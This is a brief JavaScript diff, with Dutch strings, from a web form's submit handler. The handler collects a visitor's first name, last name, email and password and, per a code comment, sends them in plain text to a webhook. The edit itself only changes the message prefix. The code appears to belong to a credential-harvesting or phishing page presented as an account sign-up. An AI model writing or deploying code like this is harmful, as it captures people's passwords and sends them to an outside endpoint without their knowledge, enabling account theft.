@@ -21,7 +21,7 @@ document.getElementById('form').addEventListener('submit', function(e) {
 
     const data = {
         username: 'Account Aanmelding',
-        content: `Nieuwe aanmelding ;):\nVoornaam: ${firstname}\nAchternaam: ${lastname}\nEmail: ${email}\nWachtwoord: ${password}`,
+        content: `Nieuwe aanmelding!:\nVoornaam: ${firstname}\nAchternaam: ${lastname}\nEmail: ${email}\nWachtwoord: ${password}`,
     };
 
     // Verzend de gegevens naar de webhook
